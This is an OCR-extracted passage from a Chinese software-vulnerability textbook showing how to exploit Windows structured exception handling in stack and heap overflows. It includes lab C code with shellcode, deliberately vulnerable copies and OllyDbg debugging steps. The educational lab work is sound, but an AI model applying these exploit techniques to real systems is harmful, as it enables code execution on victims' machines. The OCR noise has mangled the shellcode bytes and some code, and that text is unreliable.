编详选项
默认编译选项
build版本
release版木
必须使用release版本进行调试
说明：WindowsXPSP2和Windows2003中加入了对S.E.H的安全校验，因此会导致实验失败。此外，即使完全按照推
荐的实验环境进行练习，S.E.H中异常回调函数句柄的偏移及shellcode的起始地址：可能仍然需要在调试中重新确定。
暂时将shellcode赋值为一段不至于产生溢出的0x90，按照实验环境编译运行代码，程序
会自动中断，并提示选择终止运行或者进行调试。如果OllyDbg是默认调试器，直接选择“调
试”，OllyDbg会自动Attach到进程上并停在断点_asmint3处。
如图6.1.3所示，在字符串复制操作完毕后，数组中的0x90能够帮我们在调试器中轻易地
确定shellcode的起始位置0x0012FE98。
INU3
TFFTE
FI
SP
代玛中的断点
EP
日
EDI,rex
[D
aScIt "hi4
E1P
SER_stac.sa4
0x90标识出
shellcode
的起始位置
S:IE11.IYIEPTRD
字符串复制
图6.1.3定位shellcode入口地址
结构的位置和其注册的异常回调函数句柄，如图6.1.4所示。
181
---
## Page 207
0
day
OllyDbg当前线程一共安装了3个S.E.H，离栈顶最近的位于0x0012FF68，如果在当前函
安
数内发生异常，首先使用的将是这个S.E.H。我们回到栈中看看这个S.E.H的状况，OllyDbg
全
已经自动为它加上了注释，如图6.1.5所示。
：
这个S.E.H就在离EBP与函数返回地址不远的地方，0x0012FF68为指向下一个S.E.H的
软件
链表指针，0x0012FF6C处的指针0x00401214则是我们需要修改的异常回调函数句柄。
漏
洞
S.E.H
分
析
技
术
SHch
（第
2
版
EBP与返回地址
图6.1.4S.E.H链表
图6.1.5栈中的S.E.H结构体
剩下的工作就是组织缓冲区，把0x0012FF6C处的回调句柄修改成shellcode的起始地址
0x0012FE98。
缓冲区起始地址0x0012FE98与异常句柄0x0012FF6C之间共有212个字节的间隙，也就
是说，超出缓冲区12个字节后的部分将覆盖S.E.H。
仍然使用弹出“failwest”消息框的shellcode进行测试，将不足212字节的部分用0x90字
节补齐：213~216字节使用0x0012FE98填充，用于更改异常回调函数的句柄：最后删去代码
中的中断指令_asmint3。
#include
char shellcode[]=
*1x90\x901x901x90\x901x901x901x90\x90\x90\x901x901x90\×901x901x90*
"1x901x901x901x90\x901x901x901x90\x90\x901x901x901x901x90\x901x90
"\xFC\x68\x6A1x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C
\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B*
\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95*
\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59*
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A
\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75*
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03*
\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB
\x531x68\x77\x651x731x74\x68\x66\x611x69\x6C1x8B\xC41x53\x50\x50
\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90-
*\x90\x90\x90\x90\x98\xFE\x12\x00*:
182
---
## Page 208
第
DwORD MyExceptionhandler(void)
6
章
printf(got an exception,press Enter to kill process!\n*);
getchar();
形
ExitProcess(l):
形色色的内存攻击技术
void test(char*input)
char buf[200]:
int zero=0;
_try
strcpy(buf,input);//overrunthestack
zero=4/zero;//generate an exception
except(MyExceptionhandler())()
main()
test(shellcode);
重新编译，build成release之后运行，如图6.1.6所示。
X
图6.1.6成功在栈溢出中利用S.E.H
这时操作系统将错误地使用shellcode去处理除零异常，从而使植入的代码获得执行。
以上是一个最简单的在栈溢出中利用S.E.H的例子，用于让您更加深刻地领会这种攻击手
法。在真实的Windows平台漏洞利用场景中，修改S.E.H的栈溢出和修改返回地址的栈溢出几
183
---
## Page 209
0
day
乎同样流行。在许多高难度的限制条件下，直接用溢出触发异常的方法往往能得到高质量的
安全
exploit.
6.1.3
在堆溢出中利用S.E.H
软件
堆中发生溢出后往往同时伴随着异常的产生，所以，S.E.H也是堆溢出中DWORDSHOOT
漏
常常选用的目标。实验所用代码由5.4节中的代码修改得到。
洞
分
#include
析
char shellcode[]=
技
-06×106x106x106×106×106×106×106×1
术
"1x901x90\x901x901x90\x90\x90\x901x901x90\x90\x901x901x901x90\x90*
（第
\xFC\x68\x6A\x0A1x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53
2
\x68\x75\x73\x65lx72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B
版
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95*
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59*
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
\xC4\x74\x08\xC11xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75
\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A1x0A\x38\x1E\x75\xA9\x33\xDB"
x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x531x50\x50
\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90*
\xl6\x01\xlAlx00\x00\x10\x00\x00//headofthe ajacent freeblock
\x88\x06\x52\x00"//0x00520688 istheaddre8sofshel1codeinfirst
//Heapblock
\x90\x90\x90\x90*://targetofDWORDSH0OT
DWORD MyExceptionhandler(void)
ExitProcess(1);
main()
HLOCALh1=0,h2=0;
HANDLE hP:
hp=HeapCreate（0,0x1000,0x10000);
h1=HeapA11oc（hp,HEAP_ZERO_MEMORY,200);
memcpy（h1,shellcode,0x200);//over flowhere,noticed 0x200 means
//512！
s
Ltry
h2=HeapAI1oc（hp.HEAP_ZERO_MEMORY,8):
）
except(MyExceptionhandler())()
184
---
## Page 210
第
return 0:
6
章
对实验思路和代码简要解释如下。
（1）溢出第一个堆块的数据将写入后面的空闲堆块，在第二次堆分配时发生DWORD
形
SHOOT。堆溢出和DWORDSHOOT的分析请参见5.4节中的介绍。
形
色
（2）将S.E.H的异常回调函数地址作为DWORDSHOOT的目标，将其替换为shellcode的
色
入口地址，异常发生后，操作系统将错误地把shellcode当作异常处理函数而执行。
的
实验环境如表6-1-2所示。
内
存
表6-1-2实验环境
攻
推荐使用的环境
备注
击
技
操作系统
Windows 2000
虚拟机和实体机均可。本指导测试于虚拟机中
术
编译器
Visual C++ 6.0
编详选项
默认编详选项
build版本
release版本
必须使用release版本进行调试
说明：即使完全按照推荐的实验环境进行操作，S.E.H中异常回调函数句柄的地址及shellcode的起始地址可能仍然需要在
调试中重新确定。
除了DWORDSHOOT的Target不一样之外，缓冲区内其余的数据都和5.4节中所介绍的
一样。首先，我们把最后4个字节的target设置为0x90909090，这显然是一个无效的内存地址，
因此会触发异常。我们所需要做的就是在程序运行时，找到S.E.H的位置，然后把DWORD
SHOOT的target指向S.E.H的回调句柄。
首先应当确认OllyDbg能够捕捉所有的异常，方法是查看菜单“options”下的“debugging
option”中“Exceptions”选项中没有忽略任何类型的异常，如图6.1.7所示。
Debugging options
CondeDiSCPURogiSuckAn1An2An3
SoculyDebuEEceboneTeSFXSrAd
moy ac vicloninKERNEL32
gorg]loloing
厂INT3brek
Singetep break
Myc viclon
Ig donby
厂AFPUeceplos
Addiatekcepton
8
Addiange
Delete slechon
OKUndoCanc
图6.1.7OllyDbg异常捕捉选项
185
---
## Page 211
day
0
然后按照实验要求将代码编译运行，程序会自动中断，使用OllyDbgattach到进程上，直
安全：
接按F9键继续执行。
DWORDSHOOT发生后，程序产生异常。OlyDbg捕捉到异常后会自动中断，如图6.1.8
软件漏
所示。
OllyUbg-SEH_heap.exe-[CP-maio thread,m
p
区
洞
分析技术
Bddress Wex durDisassenbiy
(FPU)
EAX
//1C9BA7
77FC9BAE98AFJHP0td11.77FC993h
77FC9BA0
8809
HOU ECX,OUORD PIR DS:[ECX]
EHX
7/FC98AC
894DU DUORO PTR SS:[EBP-5A],ECX
ESP
（第2
771C98AI
38F1
CNP ESI,ECX
EOP
/1C9B01
8日
ESI
77FC9BB7
8541 FLEA EAX,OUORD PIR DS:[ECX-8]
EO1
77Fc9nnA
8945 EH0U 0U0RD PIR SS:[EBP-50],EAX
7FC9BBD
OFB710H0UZX EDX,U0RD PTR DS:[EAX]
EIP
ntd11.77Fc
版
LCX-00520689
CES0023 32bit 0（FF
P1
CS 0015
32bit （FF
S:[90909090]-77?
OllyDbg捕捉到异
SS 23 32bit e（FFF
Hex dunc
0012FDA8
DS 823 32hit e（EFF
Address
常后会自动中断
00520888
0812F006
00485230
SEH hea
5010
0012FDB0
00520000
nn 0n
00
0012F084
77E60001
KERNEL32
90
6 86 06 86 06
989094
00121 D8H
86 06 06
FC 686f
0012FDBC
00132520
0012FDC0
00137468UN1C00E
1
图6.1.8DWORDSHOOT
这时查看栈中的S.E.H情况：View一SEHchain，出现如图6.1.9所示的界面。
SEH chain ofmain thread
AddresssE handler
图6.1.9定位S.E.H结构体
发现离第一个S.E.H位于0x0012FF2C的地方，那么异常回调函数的句柄应该位于这个地
址后4个字节的位置0x0012FF30。现在，将DWORDSHOOT的目标地址由0x90909090改为
0x0012FF30，去掉程序中的中断指令，重新编译运行，结果如图6.1.10所示。
消息框成功的弹出，证明shellcode得到了执行。
186
---
## Page 212
第
6
章
形
形
色
色
的
内
存
攻
击
技
术
图6.1.10成功在DWORDSHOOT中利用S.E.H
6.1.4深入挖掘Windows异常处理
（1）不同级别的S.E.H
和堆分配机制一样，微软从未正式公开过Windows的异常处理机制。即便如此，在非官方
的文献资料中仍能找到一些对其的描述，最著名的一篇技术文章可能应当是来自微软的工程师
MattPietrek所发表的ACrashCourseontheDepthsofWin32tMStructuredExceptionHandling。在